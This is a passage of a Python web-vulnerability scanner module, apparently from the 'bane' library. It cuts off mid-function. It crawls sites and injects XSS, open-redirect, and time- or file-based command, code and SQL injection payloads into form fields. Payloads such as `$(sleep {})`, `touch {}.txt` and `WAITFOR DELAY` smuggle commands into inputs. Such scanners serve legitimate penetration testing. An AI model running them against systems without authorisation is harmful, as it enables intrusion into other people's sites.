# coding: utf-8
import subprocess, os, xtelnet, sys, cgi, re, json
from colorama import Fore, Back, Style

if sys.version_info < (3, 0):
    if (sys.platform.lower() == "win32") or (sys.platform.lower() == "win64"):
        Fore.WHITE = ""
        Fore.GREEN = ""
        Fore.RED = ""
        Fore.YELLOW = ""
        Fore.BLUE = ""
        Fore.MAGENTA = ""
        Style.RESET_ALL = ""
    import urllib, HTMLParser
    from urlparse import urlparse
    from urllib import unquote as url_decode
else:
    from urllib.parse import urlparse
    from urllib.parse import unquote as url_decode
    import urllib.parse as urllib
    import html.parser as HTMLParser

unicode = str
import requests, socket, random, time, ssl
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import bs4
from bs4 import BeautifulSoup
from bane.payloads import *
from bane.pager import *
from bane.js_fuck import js_fuck
from bane.extrafun import write_file, delete_file
from bane.info_s import extract_root_domain

def random_string(size):
    s = ""
    for x in range(size):
        s += random.choice(lis)
    return s


# why did i remove the SQL-Is part? well compared to other scanning functions they are immature. Besides SQLMap is a better option to test against SQL-Is :)


def jsfuck_encoder(text, parent=True, eval=True):
    return js_fuck().encode(text, eval, parent)


def find_xss_context(text, payload):
    try:
        a = re.search(
            "<(.*?)=?{}?(.*?)>".format(re.escape(r"{}".format(payload))), text
        ).group(0)
        b = a.replace(payload, "")
        if len(re.findall("<(.*?)>", b)) != 1:
            return payload
        else:
            return a
    except:
        return payload


def html_decoder(payload, html_encode_level=0):
    for x in range(html_encode_level):
        payload = HTMLParser.HTMLParser().unescape(payload)
    return payload


def html_encoder(text, random_level=1):
    if random_level == 1:
        d = ""
        for c in text:
            a = random.randint(0, 1)
            if a == 0:
                d += c
            else:
                d += "&#" + str(ord(c))
        return d
    if random_level == 2:
        return "".join("&#%d" % ord(c) for c in text)
    else:
        return text


def hexadecimal_encoder(text, random_level=1):
    """
    only for js functions names
    """
    if random_level == 1:
        d = ""
        for c in text:
            a = random.randint(0, 1)
            if a == 0:
                d += c
            else:
                d += hex(ord(c)).replace("0x", r"\u00")
        return d
    if random_level == 2:
        return "".join(hex(ord(c)).replace("0x", r"\u00") for c in text)
    else:
        return unicode(text)


def html_hexadecimal_encoder(text, random_level=1):
    if random_level == 1:
        d = ""
        for c in text:
            a = random.randint(0, 1)
            if a == 0:
                d += c
            else:
                d += hex(ord(c)).replace("0x", "&#x")
        return d
    if random_level == 2:
        return "".join(hex(ord(c)).replace("0x", "&#x") for c in text)
    else:
        return unicode(text)


def setup_to_submit(form):
    d = {}
    f = {}
    for x in form["inputs"]:
        if x["type"] == "file":
            f.update({x["name"]: x["value"]})
        else:
            d.update({x["name"]: x["value"]})
    return d, f


def xss_submit(
    parsed,
    payload,
    replaceble_parameters,
    debug=False,
    enctype="application/x-www-form-urlencoded",
):
    """"""
    p_o_c=parsed[0].copy()
    d, fi = setup_to_submit(parsed[0])
    for x in d:
        for y in replaceble_parameters:
            if x == y:
                for z in replaceble_parameters[y]:
                    d[x] = d[x].replace(z[0], z[1])
    if not fi:
        parsed[1].update(
            {
                "Content-Type": enctype,
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    else:
        parsed[1].update(
            {
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    if debug == True:
        for x in d:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, d[x]))
        for x in fi:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, fi[x]))
    if "application/json" in enctype:
        d = json.dumps(d)
    c=''
    if parsed[0]["method"] == "get":
        try:
            c = requests.get(
                parsed[0]["action"],
                params=d,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            ).text
            if payload in c:
                return (True, {"reflection":find_xss_context(c, payload),"p_o_c":p_o_c},any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)
        except Exception as e:
            pass
    else:
        try:
            c = requests.post(
                parsed[0]["action"],
                data=d,
                files=fi,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            ).text
            if payload in c:
                return (True, {"reflection":find_xss_context(c, payload),"p_o_c":p_o_c},any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)
        except Exception as e:
            pass
    return (False, "",any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)


def setup_proxy(pr, prs):
    if pr:
        return pr
    if prs:
        return random.choice(prs)
    return None


def setup_ua(usra):
    if usra:
        return usra
    return random.choice(ua)


def xss_forms(
    u,
    payload=None,
    unicode_random_level=0,
    number=(1, 9),
    js_function="alert",
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    dont_change={},
    predefined_inputs={},
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    context_breaker='">',
    save_to_file=None,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
):
    """
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

    usage:

    >>>import bane
    >>>bane.xss_forms('http://www.example.com/")

    >>>bane.xss_forms('http://www.example.com/',payload="<script>alert(123);</script>")

    """
    target_page = u
    if proxy:
        proxy = proxy
    if proxies:
        proxy = random.choice(proxies)
    dic = []
    pre_apyload = True
    if payload:
        xp_f = payload
        pre_apyload = False
    else:
        xp_f = '<DeTAIlS/OpeN/OntOGglE = "{} `v`"'
    if context_breaker:
        xp_f = context_breaker + xp_f
    if logs == True:
        print(Fore.WHITE + "[~]Getting forms..." + Style.RESET_ALL)
    hu = True
    fom = forms_parser(
        u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent,include_links=True
    )
    if len(fom) == 0:
        if logs == True:
            print(Fore.RED + "[-]No forms were found!!!" + Style.RESET_ALL)
        hu = False
    if hu == True:
        form_index = -1
        for l1 in fom:
            form_index += 1
            if pre_apyload == True:
                xp = xp_f.format(
                    hexadecimal_encoder(js_function, random_level=unicode_random_level)
                )
            else:
                xp = xp_f
            lst = {}
            vul = []
            sec = []
            sql_e=[]
            xml_e=[]
            p_t_e=[]
            ssrf_e=[]
            p_t_erros=[]
            ssrf_errors=[]
            hu = True
            u = l1["action"]
            if logs == True:
                print(
                    Fore.BLUE
                    + "Form: "
                    + Fore.WHITE
                    + str(form_index)
                    + Fore.BLUE
                    + "\nAction: "
                    + Fore.WHITE
                    + u
                    + Fore.BLUE
                    + "\nMethod: "
                    + Fore.WHITE
                    + l1["method"]
                    + Fore.BLUE
                    + "\nPayload: "
                    + Fore.WHITE
                    + xp
                    + Style.RESET_ALL
                )
            """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     hu=False
     if logs==True:
      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
            if True:
                extr = []
                l = []
                for x in l1["inputs"]:
                    if (
                        x["name"].strip() not in leave_empty
                        and x["name"].strip() not in dont_send
                    ):
                        if (
                            x["type"]
                            in [
                                "hidden",
                                "file",
                                "text",
                                "textarea",
                                "email",
                                "tel",
                                "search",
                                "url",
                                "password",
                                "number",
                                "select",
                                "radio",
                                "checkbox",
                                "color"
                            ]
                            and x["name"] not in dont_change
                        ):  # any input type that accept direct input from keyboard
                            i = x["name"]
                            parsed_form = set_up_injection(
                                target_page,
                                form_index,
                                i,
                                xp,
                                cookie,
                                setup_ua(user_agent),
                                setup_proxy(proxy, proxies),
                                timeout,
                                fill_empty,
                                file_extension=file_extension,
                                email_extension=email_extension,
                                phone_pattern=phone_pattern,
                                dont_change=dont_change,
                                number=number,
                                leave_empty=leave_empty,
                                dont_send=dont_send,
                                mime_type=mime_type,
                                predefined_inputs=predefined_inputs,
                            )
                            xss_res = xss_submit(
                                parsed_form,
                                xp,
                                replaceble_parameters,
                                debug=debug,
                                enctype=l1["enctype"],
                            )
                            if xss_res[0] == True:
                                x = "parameter: '" + i + "' => [+]Payload was found"
                                vul.append({'parameter':i, 'context': xss_res[1]})
                                colr = Fore.GREEN
                            else:
                                x = "parameter: '" + i + "' => [-]Payload was not found"
                                #sec.append(i)
                                colr = Fore.RED
                            if xss_res[2] == True:
                                x+=Fore.YELLOW+"\n[i] SQL Error detected"
                                sql_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if xss_res[3] == True:
                                x+=Fore.YELLOW+"\n[i] XML parsing Error detected (potential XML injection)"
                                xml_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if xss_res[4] == True:
                                x+=Fore.YELLOW+"\n[i] Fetching URL Error detected (potential SSRF)"
                                ssrf_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if xss_res[5] == True:
                                x+=Fore.YELLOW+"\n[i] Reading file Error detected (potential path traversal)"
                                p_t_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if logs == True:
                                print(colr + x + Style.RESET_ALL)
            dic.append(
                {
                    "form": u,
                    "method": l1["method"],
                    "vulnerable": vul,
                    #"safe": sec,
                    "sql_errors":sql_e,
                    "xml_parsing_errors":xml_e,
                    "fetching_url_errors":ssrf_e,
                    "reading_file_errors":p_t_e
                }
            )
        if save_to_file:
            with open(save_to_file.split(".")[0] + ".json", "w") as outfile:
                json.dump(
                    {"Payload": xp, "Page": target_page, "Output": dic},
                    outfile,
                    indent=4,
                )
            outfile.close()
        return {"payload": xp, "page": target_page, "result": dic}




def xss(
    u,
    max_pages=5,
    pages=[],
    payload=None,
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    unicode_random_level=0,
    number=(1, 9),
    js_function="alert",
    dont_change={},
    predefined_inputs={},
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    context_breaker='">',
    save_to_file=None,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        l.append(xss_forms(x,
                           payload=None,
                            unicode_random_level=unicode_random_level,
                            number=number,
                            js_function=js_function,
                            dont_change=dont_change,
                            email_extension=email_extension,
                            phone_pattern=phone_pattern,
                            predefined_inputs=predefined_inputs,
                            replaceble_parameters=replaceble_parameters,
                            file_extension=file_extension,
                            context_breaker=context_breaker,
                            save_to_file=save_to_file,
                            logs=logs,
                            fill_empty=fill_empty,
                            leave_empty=leave_empty,
                            dont_send=dont_send,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            debug=debug,
                            mime_type=mime_type))
    f=[]
    for x in l:
        if x !=None:
            n=x.copy()
            n['result']=[]
            for i in x['result']:
                if len(i['vulnerable']) > 0 or len(i['sql_errors']) > 0 or len(i['xml_parsing_errors'])>0 or len(i['fetching_url_errors'])>0 or len(i['reading_file_errors']) > 0:
                    n['result'].append(i)
            if n['result']!=[]:
                f.append(n)
    return f


def is_valid_open_redirect(req,payload):
    return url_decode(payload)==req.headers['location']



def open_redirect_submit(
    parsed,
    payload,
    replaceble_parameters,
    debug=False,
    enctype="application/x-www-form-urlencoded",
):
    """"""
    p_o_c=parsed[0].copy()
    d, fi = setup_to_submit(parsed[0])
    for x in d:
        for y in replaceble_parameters:
            if x == y:
                for z in replaceble_parameters[y]:
                    d[x] = d[x].replace(z[0], z[1])
    if not fi:
        parsed[1].update(
            {
                "Content-Type": enctype,
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    else:
        parsed[1].update(
            {
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    if debug == True:
        for x in d:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, d[x]))
        for x in fi:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, fi[x]))
    if "application/json" in enctype:
        d = json.dumps(d)
    c=''
    if parsed[0]["method"] == "get":
        try:
            c = requests.get(
                parsed[0]["action"],
                params=d,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
                allow_redirects=False
            )
            if is_valid_open_redirect(c,payload):
                return (True, {"p_o_c":p_o_c},any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)
        except Exception as e:
            pass
    else:
        try:
            c = requests.post(
                parsed[0]["action"],
                data=d,
                files=fi,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
                allow_redirects=False
            )
            if is_valid_open_redirect(c,payload)==True:
                return (True, {"p_o_c":p_o_c},any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)
        except Exception as e:
            pass
    return (False, "",any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)



def open_redirect_forms(
    u,
    payload='http://www.google.com',
    number=(1, 9),
    dont_change={},
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    predefined_inputs={},
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    save_to_file=None,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
):
    """
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

    usage:

    >>>import bane
    >>>bane.xss_forms('http://www.example.com/")

    >>>bane.xss_forms('http://www.example.com/',payload="<script>alert(123);</script>")

    """
    target_page = u
    if proxy:
        proxy = proxy
    if proxies:
        proxy = random.choice(proxies)
    dic = []
    pre_apyload = True
    if logs == True:
        print(Fore.WHITE + "[~]Getting forms..." + Style.RESET_ALL)
    hu = True
    fom = forms_parser(
        u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent,include_links=True
    )
    if len(fom) == 0:
        if logs == True:
            print(Fore.RED + "[-]No forms were found!!!" + Style.RESET_ALL)
        hu = False
    if hu == True:
        form_index = -1
        for l1 in fom:
            form_index += 1
            xp=payload
            lst = {}
            vul = []
            sec = []
            sql_e=[]
            xml_e=[]
            p_t_e=[]
            ssrf_e=[]
            p_t_erros=[]
            ssrf_errors=[]
            hu = True
            u = l1["action"]
            if logs == True:
                print(
                    Fore.BLUE
                    + "Form: "
                    + Fore.WHITE
                    + str(form_index)
                    + Fore.BLUE
                    + "\nAction: "
                    + Fore.WHITE
                    + u
                    + Fore.BLUE
                    + "\nMethod: "
                    + Fore.WHITE
                    + l1["method"]
                    + Fore.BLUE
                    + "\nPayload: "
                    + Fore.WHITE
                    + xp
                    + Style.RESET_ALL
                )
            """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     hu=False
     if logs==True:
      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
            if True:
                extr = []
                l = []
                for x in l1["inputs"]:
                    if (
                        x["name"].strip() not in leave_empty
                        and x["name"].strip() not in dont_send
                    ):
                        if (
                            x["type"]
                            in [
                                "hidden",
                                "file",
                                "text",
                                "textarea",
                                "email",
                                "tel",
                                "search",
                                "url",
                                "password",
                                "number",
                                "select",
                                "radio",
                                "checkbox",
                                "color"
                            ]
                            and x["name"] not in dont_change
                        ):  # any input type that accept direct input from keyboard
                            i = x["name"]
                            parsed_form = set_up_injection(
                                target_page,
                                form_index,
                                i,
                                xp,
                                cookie,
                                setup_ua(user_agent),
                                setup_proxy(proxy, proxies),
                                timeout,
                                fill_empty,
                                file_extension=file_extension,
                                dont_change=dont_change,
                                email_extension=email_extension,
                                phone_pattern=phone_pattern,
                                number=number,
                                leave_empty=leave_empty,
                                dont_send=dont_send,
                                mime_type=mime_type,
                                predefined_inputs=predefined_inputs,
                            )
                            xss_res = open_redirect_submit(
                                parsed_form,
                                xp,
                                replaceble_parameters,
                                debug=debug,
                                enctype=l1["enctype"],
                            )
                            if xss_res[0] == True:
                                x = "parameter: '" + i + "' => [+]Open redirect detected"
                                vul.append({'parameter':i, 'context':xss_res[1]})
                                colr = Fore.GREEN
                            else:
                                x = "parameter: '" + i + "' => [-]Failed"
                                #sec.append(i)
                                colr = Fore.RED
                            if xss_res[2] == True:
                                x+=Fore.YELLOW+"\n[i] SQL Error detected"
                                sql_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if xss_res[3]==True:
                                x+=Fore.YELLOW+"\n[i] XML parsing Error detected"
                                xml_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if xss_res[4] == True:
                                x+=Fore.YELLOW+"\n[i] Fetching URL Error detected (potential SSRF)"
                                ssrf_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if xss_res[5] == True:
                                x+=Fore.YELLOW+"\n[i] Reading file Error detected (potential path traversal)"
                                p_t_e.append({'parameter':i, 'p_o_c': xss_res[-1]})
                            if logs == True:
                                print(colr + x + Style.RESET_ALL)
            dic.append(
                {
                    "form": u,
                    "method": l1["method"],
                    "vulnerable": vul,
                    #"safe": sec,
                    "sql_errors":sql_e,
                    "xml_parsing_errors":xml_e,
                    "fetching_url_errors":ssrf_e,
                    "reading_file_errors":p_t_e
                }
            )
        if save_to_file:
            with open(save_to_file.split(".")[0] + ".json", "w") as outfile:
                json.dump(
                    {"payload": xp, "page": target_page, "result": dic},
                    outfile,
                    indent=4,
                )
            outfile.close()
        return {"payload": xp, "page": target_page, "result": dic}




def open_redirect(
    u,
    max_pages=5,
    pages=[],
    payload='http://www.google.com',
    number=(1, 9),
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    js_function="alert",
    dont_change={},
    predefined_inputs={},
    replaceble_parameters={"phpvalue": ((".", ""),)},
    file_extension="png",
    context_breaker='">',
    save_to_file=None,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        l.append(open_redirect_forms(x,
                           payload=payload,
                            number=number,
                            dont_change=dont_change,
                            predefined_inputs=predefined_inputs,
                            replaceble_parameters=replaceble_parameters,
                            file_extension=file_extension,
                            save_to_file=save_to_file,
                            email_extension=email_extension,
                            phone_pattern=phone_pattern,
                            logs=logs,
                            fill_empty=fill_empty,
                            leave_empty=leave_empty,
                            dont_send=dont_send,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            debug=debug,
                            mime_type=mime_type))
    f=[]
    for x in l:
        if x !=None:
            n=x.copy()
            n['result']=[]
            for i in x['result']:
                if len(i['vulnerable']) > 0 or len(i['sql_errors']) > 0 or len(i['xml_parsing_errors'])>0 or len(i['fetching_url_errors'])>0 or len(i['reading_file_errors']) > 0:
                    n['result'].append(i)
            if n['result']!=[]:
                f.append(n)
    return f




def rce_submit(
    parsed,
    payload,
    based_on,
    replaceble_parameters,
    debug=False,
    enctype="application/x-www-form-urlencoded",
    type_injection="code",
):
    """"""
    p_o_c=parsed[0].copy()
    d, fi = setup_to_submit(parsed[0])
    for x in d:
        for y in replaceble_parameters:
            if x == y:
                for z in replaceble_parameters[y]:
                    d[x] = d[x].replace(z[0], z[1])
    if debug == True:
        for x in d:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, d[x]))
        for x in fi:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, fi[x]))
    if "application/json" in enctype:
        d = json.dumps(d)
    t = time.time()
    if not fi:
        parsed[1].update(
            {
                "Content-Type": enctype,
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    else:
        parsed[1].update(
            {
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    c=''
    if parsed[0]["method"] == "get":
        try:
            c = requests.get(
                parsed[0]["action"],
                params=d,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            )
            if based_on[0] == "file":
                c = requests.get(
                    parsed[0]["action"].replace(
                        parsed[0]["action"].split("/")[-1], based_on[1] + ".txt"
                    ),
                    params=d,
                    headers=parsed[1],
                    proxies=parsed[2],
                    timeout=parsed[3],
                    verify=False,
                )
                if (c.status_code == 200) and (len(c.text) == 0):
                    return (
                        True,
                        {"reflection":parsed[0]["action"].replace(
                            parsed[0]["action"].split("/")[-1], based_on[1]
                        )
                        + ".txt","p_o_c":p_o_c},
                        any(s in c.text for s in sql_errors),
                        any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c
                    )
            if based_on[0] == "time":
                if type_injection == "command":
                    if (int(time.time() - t) >= based_on[1] - 2) or (
                        c.status_code == 504
                    ):
                        return (True, {"p_o_c":p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
                else:
                    if (int(time.time() - t) >= based_on[1]) or (c.status_code == 504):
                        return (True, {"p_o_c":p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
        except Exception as e:
            #print(str(e))
            if "Read timed out" in str(e):
                #if based_on[0] == "time":
                    return (True, {"p_o_c":p_o_c},False,False,False,False)
    else:
        try:
            c = requests.post(
                parsed[0]["action"],
                data=d,
                files=fi,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            )
            if based_on[0] == "file":
                c = requests.get(
                    parsed[0]["action"].replace(
                        parsed[0]["action"].split("/")[-1], based_on[1] + ".txt"
                    ),
                    params=d,
                    headers=parsed[1],
                    proxies=parsed[2],
                    timeout=parsed[3],
                    verify=False,
                )
                if (c.status_code == 200) and (len(c.text) == 0):
                    return (
                        True,
                        {"reflection":parsed[0]["action"].replace(
                            parsed[0]["action"].split("/")[-1], based_on[1]
                        )
                        + ".txt","p_o_c":p_o_c},
                        any(s in c.text for s in sql_errors),
                        any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c
                    )
            if based_on[0] == "time":
                if (int(time.time() - t) >= based_on[1] - 2) or (c.status_code == 504):
                    return (True, {"p_o_c":p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
                else:
                    if (int(time.time() - t) >= based_on[1]) or (c.status_code == 504):
                        return (True, {"p_o_c":p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
        except Exception as e:
            #print(str(e))
            if "Read timed out" in str(e):
                #if based_on[0] == "time":
                    return (True, {"p_o_c":p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
    return (False, "",any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)


def rce_forms(
    u,
    payload_index=0,
    save_to_file=None,
    dont_change={},
    number=(1, 9),
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    injection={"code": "php"},
    code_operator_right="; ",
    code_operator_left="",
    command_operator_right="|",
    command_operator_left="&",
    sql_operator_right="or '",
    sql_operator_left="' or ",
    file_extension="png",
    replaceble_parameters={"phpvalue": ((".", ""),)},
    based_on="time",
    delay=10,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
):
    """
    this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

    usage:

    >>>import bane
    >>>bane.rce_forms('http://phptester.net/")

    """
    payloads = {
        "command": {
            "linux": {
                "file": ["touch {}.txt", "`touch {}.txt`", "$(touch {}.txt)"],
                "time": ["sleep {}", "`sleep {}`", "$(sleep {})"],
            },
            "windows": {"file": ["copy nul {}.txt"], "time": ["ping -n {} 127.0.0.1"]},
        },
        "code": {
            "python": {
                "file": [" open('{}.txt', 'w') "],
                "time": [" __import__('time').sleep({}) "],
            },
            "php": {
                "file": [" file_put_contents('{}.txt', '') "],
                "time": [" sleep({}) "],
            },
            "ruby": {"file": [' File.new("{}.txt", "w") '], "time": [" sleep({}) "]},
            "perl": {
                "file": [' open ( my $fh, ">", "{}.txt") '],
                "time": [" sleep({}) "],
            },
            "js": {
                "file": [" require('fs').createWriteStream('{}.txt', {flags: 'w'})  "],
                "time": [
                    " (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) ",
                    " await (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) ",
                ],
            },
        },
        "sql": {
            "mysql": {"time": [" sleep({}) "]},
            "oracle": {"time": [" dbms_lock.sleep({}) "]},
            "postgre": {"time": [" pg_sleep({}) "]},
            "sql_server": {"time": [" WAITFOR DELAY '00:00:{}' "]},
        },
    }
    target_page = u
    xp = ""
    based_on_o = based_on
    if list(injection.keys())[0] == "command":
        xp += command_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == "file":
            based_on = ("file", random_string(random.randint(3, 10)))
        else:
            based_on = ("time", int(delay) + 2)
        xp = xp.format(based_on[1])
        xp += command_operator_right
    elif list(injection.keys())[0] == "code":
        xp += code_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == "file":
            based_on = ("file", random_string(random.randint(3, 10)))
        else:
            based_on = ("time", int(delay))
        xp = xp.format(based_on[1])
        xp += code_operator_right
    else:
        xp += sql_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == "file":
            based_on = ("file", random_string(random.randint(3, 10)))
        else:
            based_on = ("time", int(delay))
        xp = xp.format(based_on[1])
        xp += sql_operator_right
    target_page = u
    form_index = -1
    if proxy:
        proxy = proxy
    if proxies:
        proxy = random.choice(proxies)
    dic = []
    if logs == True:
        print(Fore.WHITE + "[~]Getting forms..." + Style.RESET_ALL)
    hu = True
    fom = forms_parser(
        u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent,include_links=True
    )
    if len(fom) == 0:
        if logs == True:
            print(Fore.RED + "[-]No forms were found!!!" + Style.RESET_ALL)
        hu = False
    if hu == True:
        for l1 in fom:
            form_index += 1
            lst = {}
            sql_e=[]
            xml_e=[]
            p_t_e=[]
            ssrf_e=[]
            p_t_erros=[]
            ssrf_errors=[]
            vul = []
            sec = []
            hu = True
            u = l1["action"]
            if logs == True:
                print(
                    Fore.BLUE
                    + "Form: "
                    + Fore.WHITE
                    + str(form_index)
                    + Fore.BLUE
                    + "\nAction: "
                    + Fore.WHITE
                    + u
                    + Fore.BLUE
                    + "\nMethod: "
                    + Fore.WHITE
                    + l1["method"]
                    + Fore.BLUE
                    + "\nPayload: "
                    + Fore.WHITE
                    + xp.replace(
                        " {} ".format(int(delay) + 2), " {} ".format(int(delay))
                    )
                    + Style.RESET_ALL
                )
                """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     if logs==True:
      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
            if True:
                extr = []
                l = []
                for x in l1["inputs"]:
                    if (
                        x["name"].strip() not in leave_empty
                        and x["name"].strip() not in dont_send
                    ):
                        try:
                            if (
                                x["type"]
                                in [
                                    "hidden",
                                    "file",
                                    "text",
                                    "textarea",
                                    "email",
                                    "tel",
                                    "search",
                                    "url",
                                    "password",
                                    "number",
                                    "select",
                                    "radio",
                                    "checkbox",
                                    "color"
                                ]
                                and x["name"] not in dont_change
                            ):  # any input type that accept direct input from keyboard
                                i = x["name"]
